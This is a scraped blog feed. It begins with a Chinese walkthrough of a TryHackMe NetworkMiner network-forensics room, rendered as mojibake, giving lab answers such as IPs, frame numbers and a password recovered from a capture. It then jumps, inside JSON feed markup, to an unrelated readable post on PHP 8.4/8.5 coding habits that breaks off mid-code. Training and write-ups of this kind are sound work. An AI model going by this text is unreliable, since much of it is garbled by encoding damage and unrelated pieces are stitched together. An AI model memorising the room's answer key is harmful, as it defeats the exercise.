‡åœ°å€</li>\n<li>å§‹å‘æ¸¯å’Œç›®çš„æ¸¯</li>\n<li>åè®®</li>\n<li>æ—¶é—´æˆ³</li>\n<li>é‡å»ºè·¯å¾„</li>\n<li>ç»†èŠ‚</li>\n</ul>\n<p>éƒ¨åˆ†åŠŸèƒ½ï¼ˆä¾‹å¦‚å¼€æºæƒ…æŠ¥å“ˆå¸Œå€¼æŸ¥æ‰¾å’Œæ ·æœ¬æäº¤ï¼‰ä»…åœ¨é«˜çº§ç‰ˆä¸­å¯ç”¨ã€‚æœç´¢æ ä¹Ÿåœ¨æ­¤å¤„å¯ç”¨ã€‚å³é”®èœå•åœ¨æ­¤ä¹Ÿååˆ†å®žç”¨ã€‚æ‚¨å¯ä»¥è½»æ¾æ‰“å¼€æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c83d1ef3c997d78ee84ed5af7d7ec242.png\" /></p>\n<h5 id=\"å›¾ç‰‡\">å›¾ç‰‡</h5>\n<p>æ–‡ä»¶èœå•æ˜¾ç¤ºä»Žåˆ†æžçš„ pcap æ–‡ä»¶ä¸­æå–çš„å›¾åƒã€‚å³é”®èœå•åœ¨è¿™é‡Œä¹Ÿå¾ˆæœ‰ç”¨ã€‚æ‚¨å¯ä»¥è½»æ¾æ‰“å¼€æ–‡ä»¶å¹¶æ”¾å¤§ç¼©å°ã€‚<br />\n<img alt=\"600\" src=\"https://i-blog.csdnimg.cn/img_convert/5e5be50c2e95733cc099f7adfd134cfc.png\" /><br />\nå°†é¼ æ ‡æ‚¬åœåœ¨å›¾åƒä¸Šï¼Œå³å¯æ˜¾ç¤ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæºåœ°å€ã€ç›®æ ‡åœ°å€å’Œæ–‡ä»¶è·¯å¾„ï¼‰ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5135754094ca52cb7b72b4b3f70dd53f.png\" /></p>\n<h5 id=\"å‚æ•°\">å‚æ•°</h5>\n<p>æ–‡ä»¶èœå•æ˜¾ç¤ºä»Žæ‰€åˆ†æžçš„ pcap æ–‡ä»¶ä¸­æå–çš„å‚æ•°ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>å‚æ•°åç§°</li>\n<li>å‚æ•°å€¼</li>\n<li>è½¦æž¶å·</li>\n<li>æºä¸»æœºå’Œç›®æ ‡ä¸»æœº</li>\n<li>å§‹å‘æ¸¯å’Œç›®çš„æ¸¯</li>\n<li>æ—¶é—´æˆ³</li>\n<li>ç»†èŠ‚</li>\n</ul>\n<p>å³é”®èœå•åœ¨è¿™é‡Œä¹Ÿå¾ˆæœ‰ç”¨ã€‚æ‚¨å¯ä»¥è½»æ¾å¤åˆ¶å‚æ•°å’Œå€¼ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ab5e7671e2770063e563f1fe99f90355.png\" /></p>\n<h5 id=\"å…³é”®è¯keyword\">å…³é”®è¯(keyword)</h5>\n<p>æ–‡ä»¶èœå•æ˜¾ç¤ºä»Žå·²åˆ†æžçš„ pcap æ–‡ä»¶ä¸­æå–çš„å…³é”®è¯ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è½¦æž¶å·</li>\n<li>æ—¶é—´æˆ³</li>\n<li>å…³é”®è¯</li>\n<li>è¯­å¢ƒ</li>\n<li>æºä¸»æœºå’Œç›®æ ‡ä¸»æœº</li>\n<li>å§‹å‘æ¸¯å’Œç›®çš„æ¸¯</li>\n</ul>\n<p><strong>å¦‚ä½•ç­›é€‰å…³é”®è¯ï¼š</strong></p>\n<ul>\n<li>æ·»åŠ å…³é”®è¯</li>\n<li>é‡æ–°åŠ è½½æ¡ˆä»¶æ¡£æ¡ˆï¼</li>\n</ul>\n<p><strong>æ³¨æ„ï¼š</strong> æ‚¨å¯ä»¥åœ¨æ­¤éƒ¨åˆ†ç­›é€‰å¤šä¸ªå…³é”®è¯ï¼›ä½†æ˜¯ï¼Œæ›´æ–°æœç´¢å…³é”®è¯åŽï¼Œæ‚¨å¿…é¡»é‡æ–°åŠ è½½æ¡ˆä¾‹æ–‡ä»¶ã€‚å…³é”®è¯æœç´¢ä¼šæœç´¢å·²å¤„ç† pcap æ–‡ä»¶ä¸­çš„æ‰€æœ‰å¯èƒ½æ•°æ®ã€‚<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081107193-1624073098.png&amp;pos_id=img-e4o2UobV-1767225916458\" /></p>\n<h5 id=\"æ¶ˆæ¯\">æ¶ˆæ¯</h5>\n<p>æ¶ˆæ¯èœå•æ˜¾ç¤ºä»Žå·²è°ƒæŸ¥çš„ pcap æ–‡ä»¶ä¸­æå–çš„ç”µå­é‚®ä»¶ã€èŠå¤©è®°å½•å’Œæ¶ˆæ¯ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è½¦æž¶å·</li>\n<li>æºä¸»æœºå’Œç›®æ ‡ä¸»æœº</li>\n<li>åè®®</li>\n<li>å‘ä»¶äººï¼ˆFromï¼‰</li>\n<li>æŽ¥æ”¶å™¨ï¼ˆè‡³ï¼‰</li>\n<li>æ—¶é—´æˆ³</li>\n<li>å°ºå¯¸</li>\n</ul>\n<p>ç­›é€‰æµé‡å¹¶æ‰¾åˆ°åŒ¹é…é¡¹åŽï¼Œæ‚¨å°†çœ‹åˆ°æ‰€é€‰é‚®ä»¶çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚é™„ä»¶å’Œå±žæ€§ã€‚è¯·æ³¨æ„ï¼Œæ­¤å¤„ä¹Ÿæä¾›æœç´¢æ ã€‚å³é”®èœå•ä¹Ÿåœ¨æ­¤å¤„å¯ç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å†…ç½®æŸ¥çœ‹å™¨æŸ¥çœ‹æ•´ä½“ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨â€œæ‰“å¼€æ–‡ä»¶â€é€‰é¡¹æµè§ˆé™„ä»¶ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/75374fee89f09de1900657713d524e55.png\" /></p>\n<h5 id=\"å¼‚å¸¸\">å¼‚å¸¸</h5>\n<p>å¼‚å¸¸èœå•ä¼šæ˜¾ç¤ºå·²å¤„ç†pcapæ–‡ä»¶ä¸­æ£€æµ‹åˆ°çš„å¼‚å¸¸ã€‚è¯·æ³¨æ„ï¼ŒNetworkMiner å¹¶éžå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ(IDS)ã€‚ä½†æ˜¯ï¼Œå¼€å‘è€…æ·»åŠ äº†ä¸€äº›é’ˆå¯¹ EternalBlue æ¼æ´žåˆ©ç”¨å’Œæ¬ºéª—æ”»å‡»çš„æ£€æµ‹åŠŸèƒ½ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d9bfd0a0db3ba241c186f906d1d06316.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜<br />\nä¸Žå¸§ 63075 å…³è”çš„æ–‡ä»¶ä¸­æåˆ°çš„ Linux å‘è¡Œç‰ˆçš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/06fe585bfb7ffb4c0e26c3c480d91e7a.png\" /><br />\næ‰“å¼€å¯¹åº”çš„æ–‡ä»¶å³å¯å‘çŽ°æ˜¯ä»€ä¹ˆæ“ä½œç³»ç»Ÿ</p>\n<pre><code class=\"language-python\">CentOS\n</code></pre>\n<p>ä¸Žç¬¬ 75942 å¸§å…³è”çš„é¡µé¢çš„é¡µçœ‰æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nåŒç†æ‰“å¼€å¯¹åº”çš„å¸§æ–‡ä»¶</p>\n<pre><code class=\"language-python\">Password-Ned AB\n</code></pre>\n<p>å›¾ç‰‡<code>â€œads.bmp.2E5F0FD9[1].bmpâ€</code>çš„æºåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç­›é€‰å…³é”®å­—æˆ–è€…ä½ ç›´æŽ¥åŽ»æ‰¾å›¾ç‰‡<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/67a1e303e0ce36305014f018075f737d.png\" /></p>\n<pre><code class=\"language-python\">80.239.178.187\n</code></pre>\n<p>å¯èƒ½å‡ºçŽ°TLSå¼‚å¸¸çš„å¸§å·æ˜¯å¤šå°‘ï¼Ÿ</p>\n<pre><code class=\"language-python\">36255\n</code></pre>\n<p>æŸ¥çœ‹é‚®ä»¶å†…å®¹ã€‚å“ªä¸ªå¹³å°å‘é€äº†ä¸»é¢˜ä»¥â€œæ‚¨è¿˜æœ‰æ›´å¤šâ€å¼€å¤´çš„é‚®ä»¶ï¼Ÿ<br />\nç‚¹å¼€messageçš„é¡µé¢tabå³å¯çŸ¥é“</p>\n<pre><code class=\"language-python\">Facebook\n</code></pre>\n<p>Branson Mathesonçš„ç”µå­é‚®ä»¶åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nåŒç†æŸ¥çœ‹message</p>\n<pre><code class=\"language-python\">branson@sandsite.org\n</code></pre>\n<h4 id=\"ç‰ˆæœ¬å·®å¼‚\">ç‰ˆæœ¬å·®å¼‚</h4>\n<p>å’Œå¾€å¸¸ä¸€æ ·ï¼Œéšç€ç‰ˆæœ¬å‡çº§ï¼ŒåŠŸèƒ½æ”¹è¿›ä¹Ÿåœ¨æ‰€éš¾å…ã€‚ç‰ˆæœ¬å‡çº§é€šå¸¸ä¼šå¸¦æ¥ç¨³å®šæ€§æå‡ã€å®‰å…¨ä¿®å¤å’Œæ–°åŠŸèƒ½ã€‚è¿™é‡Œæåˆ°çš„åŠŸèƒ½éƒ¨åˆ†æ¯”è¾ƒå¤æ‚ã€‚åŠŸèƒ½å‡çº§å¯èƒ½åŒ…æ‹¬å®žçŽ°æ–°åŠŸèƒ½ï¼Œä¹Ÿå¯èƒ½åŒ…æ‹¬æ›´æ–°çŽ°æœ‰åŠŸèƒ½ï¼ˆä¾‹å¦‚ä¼˜åŒ–ã€ä¿®æ”¹æˆ–æ“ä½œæ¨¡å¼è°ƒæ•´ï¼‰ã€‚æ‚¨å¯ä»¥éšæ—¶<a href=\"https://www.netresec.com/?page=NetworkMiner\" rel=\"noopener nofollow\" target=\"_blank\">åœ¨æ­¤å¤„ï¼šhttps://www.netresec.com/?page=NetworkMiner</a>æŸ¥çœ‹æ›´æ–°æ—¥å¿—ã€‚</p>\n<p>ç”±äºŽä¸åŒç‰ˆæœ¬ä¹‹é—´å­˜åœ¨ä¸€äº›æ˜¾è‘—å·®å¼‚ï¼Œå› æ­¤æä¾›çš„è™šæ‹ŸæœºåŒæ—¶åŒ…å«äº†ä¸¤ä¸ªä¸»è¦ç‰ˆæœ¬ï¼ˆv1.6 å’Œ v2.7ï¼‰ã€‚å½“ç„¶ï¼Œéšç€ç¨‹åºç‰ˆæœ¬çš„æå‡ï¼ŒåŠŸèƒ½å’ŒèŒƒå›´ä¹Ÿä¼šç›¸åº”å¢žåŠ ã€‚ä»¥ä¸‹æ˜¯ç‰ˆæœ¬ 1.6 å’Œ 2.7 ä¹‹é—´çš„ä¸»è¦åŒºåˆ«ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>\n<h5 id=\"macåœ°å€å¤„ç†\">MACåœ°å€å¤„ç†</h5>\n<p>NetworkMiner 2 åŠæ›´é«˜ç‰ˆæœ¬å¯ä»¥å¤„ç† MAC åœ°å€å…³è”ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ­¤é€‰é¡¹å¯å¸®åŠ©æ‚¨è¯†åˆ«æ˜¯å¦å­˜åœ¨ MAC åœ°å€å†²çªã€‚<code>2 åŠæ›´æ—©ç‰ˆæœ¬ä¸å…·å¤‡æ­¤åŠŸèƒ½</code>ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/206eb5c26c144ae8977e040a9aaff613.png\" /></p>\n<p>NetworkMiner 1.6 åŠæ›´æ—©ç‰ˆæœ¬å¯ä»¥æ›´è¯¦ç»†åœ°å¤„ç†æ•°æ®åŒ…ã€‚è¿™äº›é€‰é¡¹å¯ä»¥å¸®åŠ©æ‚¨ä»¥æ›´è¯¦ç»†çš„æ ¼å¼åˆ†æžå·²å‘é€/å·²æŽ¥æ”¶çš„æ•°æ®åŒ…ã€‚1.6 åŠæ›´é«˜ç‰ˆæœ¬ä¸å†æä¾›æ­¤åŠŸèƒ½ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a8a0f8f8d4e8fcfa8ea664914c51c385.png\" /></p>\n<h5 id=\"å¸§å¤„ç†\">å¸§å¤„ç†</h5>\n<p>NetworkMiner 1.6 åŠæ›´æ—©ç‰ˆæœ¬æ”¯æŒå¸§å¤„ç†ã€‚æ­¤é€‰é¡¹æä¾›å¸§çš„æ•°é‡ä»¥åŠå¸§çš„åŸºæœ¬ä¿¡æ¯ã€‚1.6 åŠæ›´é«˜ç‰ˆæœ¬ä¸å†æä¾›æ­¤åŠŸèƒ½ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/749a1fc79d0f171561e4d6adb4b370db.png\" /></p>\n<h5 id=\"å‚æ•°å¤„ç†\">å‚æ•°å¤„ç†</h5>\n<p>NetworkMiner 2 åŠæ›´é«˜ç‰ˆæœ¬å¯ä»¥å¤„ç†æ›´å…¨é¢çš„å‚æ•°ã€‚å› æ­¤ï¼Œ1.6.xx ç‰ˆæœ¬æ”¯æŒçš„å‚æ•°æ¯” 2 ç‰ˆæœ¬å°‘ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/05dccda23c5ae576e176c84f7a9fd4f6.png\" /><br />\nNetworkMiner 1.6 åŠæ›´æ—©ç‰ˆæœ¬å¯ä»¥å¤„ç†æ˜Žæ–‡æ•°æ®ã€‚æ­¤é€‰é¡¹ä¼šåœ¨å•ä¸ªæ ‡ç­¾é¡µä¸­æ˜¾ç¤ºæ‰€æœ‰æå–çš„æ˜Žæ–‡æ•°æ®ï¼Œä¾¿äºŽåˆ†æžæµé‡æ•°æ®çš„æ˜Žæ–‡ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæ— æ³•å°†æ˜Žæ–‡æ•°æ®ä¸Žæ•°æ®åŒ…è¿›è¡ŒåŒ¹é…ã€‚1.6 åŠæ›´é«˜ç‰ˆæœ¬ä¸å†æä¾›æ­¤åŠŸèƒ½ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/bd7017640cafe3d8d4c7e7ebef24cb5b.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>å“ªä¸ªç‰ˆæœ¬å¯ä»¥æ£€æµ‹é‡å¤çš„MACåœ°å€ï¼Ÿ</p>\n<pre><code class=\"language-python\">2.7\n</code></pre>\n<p>å“ªä¸ªç‰ˆæœ¬å¯ä»¥å¤„ç†å¸§ï¼Ÿ</p>\n<pre><code class=\"language-python\">1.6\n</code></pre>\n<p>å“ªä¸ªç‰ˆæœ¬å¯ä»¥æä¾›æ›´è¯¦ç»†çš„æ•°æ®åŒ…ä¿¡æ¯ï¼Ÿ</p>\n<pre><code class=\"language-python\">1.6\n</code></pre>\n<h4 id=\"ç»ƒä¹ \">ç»ƒä¹ </h4>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/fd256df23ad884f75b2011d53086f374.png\" /><br />\nä¸»æœº 131.151.37.122 çš„æ“ä½œç³»ç»Ÿåç§°æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ca97d3e11e6a8ba843e4abac3fb70245.png\" /></p>\n<pre><code class=\"language-python\">Windows - Windows NT 4\n</code></pre>\n<p>è°ƒæŸ¥ä¸»æœº 131.151.37.122 å’Œ 131.151.32.91ã€‚<br />\né€šè¿‡ç«¯å£ 1065 ä»Žä¸»æœº 131.151.32.91 å‘ä¸»æœº 131.151.37.122 æŽ¥æ”¶äº†å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼Ÿ<br />\nè¿™é‡Œé—®çš„æ˜¯1065ç«¯å£ï¼Œä¸èƒ½ç›´æŽ¥çœ‹receivedï¼Œé‚€åŽ»çœ‹sessionsé‚£é‡Œçœ‹å¯¹åº”çš„ç«¯å£å­—èŠ‚æ•°ï¼Œè¿˜è¦çœ‹æ˜¯ä¸»æœº131.151.32.91 å‘ä¸»æœº 131.151.37.122æŽ¥æ”¶çš„æ•°æ®<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/9cea4ea127b2bdce49251a674f03124e.png\" /></p>\n<pre><code class=\"language-python\">192\n</code></pre>\n<p>è°ƒæŸ¥ä¸»æœº 131.151.37.122 å’Œ 131.151.32.21ã€‚<br />\né€šè¿‡ç«¯å£ 143 ä»Žä¸»æœº 131.151.37.122 å‘ä¸»æœº 131.151.32.21 æŽ¥æ”¶äº†å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/46945a85d5dee3237747b211256cf309.png\" /></p>\n<pre><code class=\"language-python\">20769\n</code></pre>\n<p>ç¬¬ 9 å¸§çš„åºåˆ—å·æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/35fff41ca3bd79cfc39932aeaaf0a276.png\" /></p>\n<pre><code class=\"language-python\">2AD77400\n</code></pre>\n<p>æ£€æµ‹åˆ°çš„â€œå†…å®¹ç±»åž‹â€æœ‰å¤šå°‘ç§ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ab43fab2fb64b9a7da36af18ea0ebe21.png\" /></p>\n<pre><code class=\"language-python\">2\n</code></pre>\n<p>è¯¥USBäº§å“çš„å“ç‰Œåç§°æ˜¯ä»€ä¹ˆï¼Ÿ</p>\n<p>å‘ä¸‹æµè§ˆç»“æžœï¼Œæˆ‘å‘çŽ°ä¸€ä¸ªç‰¹åˆ«ä¹‹å¤„ã€‚åœ¨â€œæ–‡ä»¶åâ€åˆ—ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ° hi-Speed-usb2.0_ax99772.htmã€‚æˆ‘è®¤ä¸ºè¿™è¡¨æ˜Žå®ƒæŒ‡çš„æ˜¯å®žé™…çš„ USB è®¾å¤‡ã€‚å› æ­¤ï¼Œå¦‚æžœæˆ‘ä»¬å‘å³ç§»åŠ¨åˆ°â€œæºä¸»æœºâ€åˆ—ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªåŸŸåï¼Œè¿™ä¸ªåŸŸåå°±æ˜¯ USB è®¾å¤‡çš„å“ç‰Œï¼Œä¹Ÿæ˜¯è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆã€‚æ‰¾åˆ°ç­”æ¡ˆåŽï¼Œå°†å…¶è¾“å…¥åˆ° TryHackMe çš„ç­”æ¡ˆå­—æ®µä¸­ï¼Œç„¶åŽç‚¹å‡»æäº¤ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/353c7ea2e2c53af0f4f6fe37d3fd48b7.png\" /></p>\n<pre><code class=\"language-python\">ASIX\n</code></pre>\n<p>è¯·é—®è¿™æ¬¾æ‰‹æœºçš„åž‹å·æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/fe95ddd1f47c0df74ea3541ab4a51fb2.png\" /></p>\n<pre><code class=\"language-python\">Lumia 535\n</code></pre>\n<p>è¿™å¼ é±¼çš„å›¾ç‰‡æ¥æºIPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/1f4ff5a9b0217b1dfaab4d549b3bb7e3.png\" /></p>\n<pre><code class=\"language-python\">50.22.95.9\n</code></pre>\n<p><code>â€œhomer.pwned.se@gmx.comâ€</code>çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/aca81c2b2aedfc100f28dfdd67c036fc.png\" /></p>\n<pre><code class=\"language-python\">spring2015\n</code></pre>\n<p>ç¬¬ 62001 å¸§çš„ DNS æŸ¥è¯¢æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f57545efc740d75f7869f7e8b762293a.png\" /></p>\n<pre><code class=\"language-python\">pop.gmx.com\n</code></pre>\n\n</div>\n<div id=\"MySignature\">\n    <p>æœ¬æ–‡æ¥è‡ªåšå®¢å›­ï¼Œä½œè€…ï¼š<a href=\"https://www.cnblogs.com/dhan\">ç«¹ç­‰å¯’</a>ï¼Œè½¬è½½è¯·æ³¨æ˜ŽåŽŸæ–‡é“¾æŽ¥ã€‚</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-01 08:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/dhan\">ç«¹ç­‰å¯’</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "2026 年 PHP 开发者进阶 快速高效开发学习习惯",
      "link": "https://www.cnblogs.com/catchadmin/p/19429440",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19429440\" id=\"cb_post_title_url\" title=\"发布于 2026-01-01 07:48\">\n    <span>2026 年 PHP 开发者进阶 快速高效开发学习习惯</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"2026-年-php-开发者进阶-快速高效开发学习习惯\">2026 年 PHP 开发者进阶 快速高效开发学习习惯</h1>\n<h2 id=\"为什么-2026-年的进阶方式不同了\">为什么 2026 年的进阶方式不同了</h2>\n<p>2026 年，成为更好的 PHP 开发者，靠的不是记住更多语法技巧，而是养成<strong>复利习惯</strong>——那些可重复的小实践，每周都在悄悄改善代码库。</p>\n<p>行业的方向很明确：</p>\n<ul>\n<li><strong>PHP 变得更具表达力、更安全</strong>（PHP 8.4 和 8.5 带来的改进，日常工作中都能感受到）</li>\n<li><strong>工具变得更严格，也更有价值</strong>——能捕获那些一直让我们付出代价的生产故障（类型错误、null 处理、不安全的数组、不完整的重构）</li>\n<li><strong>安全和供应链成为工程基础</strong>，不再是某个独立部门的事（Composer audit 和 OWASP 思维已经是常见词汇）</li>\n</ul>\n<p>所以 2026 年的进阶公式不是励志海报，而是一套习惯：</p>\n<ul>\n<li>减少意外</li>\n<li>缩短反馈循环</li>\n<li>让正确性比聪明更容易</li>\n</ul>\n<p>接下来介绍真正有效的习惯——不是纸上谈兵。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/level-up-php-developer-high-impact-habits\" rel=\"noopener nofollow\" target=\"_blank\">原文 2026 年 PHP 开发者进阶 快速高效开发学习习惯</a></p>\n<h2 id=\"习惯-1把升级当作每周维护别等到年底恐慌\">习惯 1：把升级当作每周维护，别等到年底恐慌</h2>\n<p>PHP 8.5 于 2025 年 11 月 20 日发布，包含管道操作符、URI 扩展、克隆时修改属性等改进开发体验的功能。</p>\n<p>PHP 8.4 引入了属性钩子和非对称可见性——都能减少样板代码，降低意外修改的风险。</p>\n<p>具体功能不是重点，重要的是信号：现代 PHP 让代码更容易做到：</p>\n<ul>\n<li>明确表达不变量</li>\n<li>难以被误用</li>\n<li>安全重构</li>\n</ul>\n<h3 id=\"实用的升级习惯可扩展到多个仓库\">实用的升级习惯（可扩展到多个仓库）</h3>\n<p>每周（或每两周）做一次简短的升级检查：</p>\n<ol>\n<li>升级依赖的补丁版本</li>\n<li>运行测试 + 静态分析</li>\n<li>持续发布小升级</li>\n</ol>\n<p>避免\"六个月依赖雪崩\"阻塞真正的工作。</p>\n<p><strong>具体步骤：</strong></p>\n<p><strong>1. 固定平台版本，让 Composer 在不同机器上解析一致：</strong></p>\n<pre><code class=\"language-json\">{\n  \"require\": {\n    \"php\": \"^8.3\"\n  },\n  \"config\": {\n    \"platform\": {\n      \"php\": \"8.3.0\"\n    }\n  }\n}\n</code></pre>\n<p><strong>2. 在 CI 中添加\"未来 PHP\"版本的任务，提前处理兼容性：</strong></p>\n<ul>\n<li>保持主运行时稳定</li>\n<li>添加第二个任务，在下一个小版本上运行测试</li>\n<li>逐步修复不兼容</li>\n</ul>\n<p><strong>3. 读官方发布说明，别只看博客摘要</strong></p>\n<p>官方 PHP 8.5 和 8.4 发布公告简短且可操作。</p>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>不再把\"学习 PHP\"当作琐碎知识，而是把它当作一个活跃的运行时——它会改变工程约束。</p>\n<h2 id=\"习惯-2把数据边界作为默认架构策略\">习惯 2：把\"数据边界\"作为默认架构策略</h2>\n<p>大多数 PHP 生产 bug 都不奇特，通常是：</p>\n<ul>\n<li>数组缺少键</li>\n<li>字符串应该是 int</li>\n<li>可空值没被当作可空处理</li>\n<li>\"临时\"输入格式变成了永久格式</li>\n</ul>\n<p>修复方法无聊但强大：<strong>尽早把不可信输入转换成类型化对象，别在系统里传原始数组。</strong></p>\n<h3 id=\"简单的-dto-边界框架无关\">简单的 DTO 边界（框架无关）</h3>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class CreateOrderInput\n{\n    public function __construct(\n        public readonly string $customerId,\n        public readonly int $totalCents,\n        public readonly string $currency,\n    ) {\n        if ($this-&gt;customerId === '') {\n            throw new InvalidArgumentException('customerId is required');\n        }\n        if ($this-&gt;totalCents &lt;= 0) {\n            throw new InvalidArgumentException('totalCents must be positive');\n        }\n        if (!preg_match('/^[A-Z]{3}$/', $this-&gt;currency)) {\n            throw new InvalidArgumentException('currency must be ISO-4217 like \"USD\"');\n        }\n    }\n\n    public static function fromArray(array $payload): self\n    {\n        return new self(\n            customerId: (string)($payload['customerId'] ?? ''),\n            totalCents: (int)($payload['totalCents'] ?? 0),\n            currency: strtoupper(trim((string)($payload['currency'] ?? ''))),\n        );\n    }\n}\n</code></pre>\n<p>服务层不用猜了，接收的是保证的结构。</p>\n<h3 id=\"用枚举表示允许的值别用注释\">用枚举表示\"允许的值\"，别用注释</h3>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nenum OrderStatus: string\n{\n    case Created = 'CREATED';\n    case Paid = 'PAID';\n    case Cancelled = 'CANCELLED';\n}\n</code></pre>\n<p>这样就消除了：</p>\n<ul>\n<li>无效字符串状态</li>\n<li>拼写错误 bug</li>\n<li>一半的 <code>if ($status === '...')</code> 混乱</li>\n</ul>\n<h3 id=\"想要可读但不可写时用非对称可见性\">想要\"可读但不可写\"时用非对称可见性</h3>\n<p>PHP 8.4 的非对称可见性非常适合不应从外部修改的领域对象。</p>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Shipment\n{\n    public function __construct(\n        public private(set) string $status = 'CREATED',\n    ) {}\n\n    public function markInTransit(): void\n    {\n        $this-&gt;status = 'IN_TRANSIT';\n    }\n}\n</code></pre>\n<p><strong>为什么这个习惯有用：</strong></p>\n<p>不再依赖纪律（\"请传正确的结构\"），而是依赖约束（\"不正确就快速失败\"）。</p>\n<h2 id=\"习惯-3把不变量放在它保护的状态旁边\">习惯 3：把不变量放在它保护的状态旁边</h2>\n<p>很多 PHP 代码库里，验证是分散的：</p>\n<ul>\n<li>控制器验证一点</li>\n<li>服务验证一点</li>\n<li>仓储再验证一点</li>\n<li>生产环境还是出现\"不可能\"的状态</li>\n</ul>\n<p>PHP 8.4 属性钩子能在属性访问时强制执行规则，不用写无尽的 setter 样板。</p>\n<h3 id=\"现实的不变量已付金额不能超过总额\">现实的不变量：\"已付金额不能超过总额\"</h3>\n<pre><code class=\"language-php\">&lt;?php\ndeclare(strict_types=1);\n\nfinal class Money\n{\n    public function __construct(\n        public readonly string $currency,\n        public readonly int $cents,\n    ) {\n        if ($this-&gt;cents &lt; 0) {\n            throw new InvalidArgumentException('Money cannot be negative');\n        }\n        if (!preg_match('/^[A-Z]{3}$/', $this-&gt;currency)) {\n            throw new InvalidArgumentException('Invalid currency');\n        }\n    }\n}\n\nfinal class Invoice\n{\n    public function __construct(\n        public readonly Money $total,\n    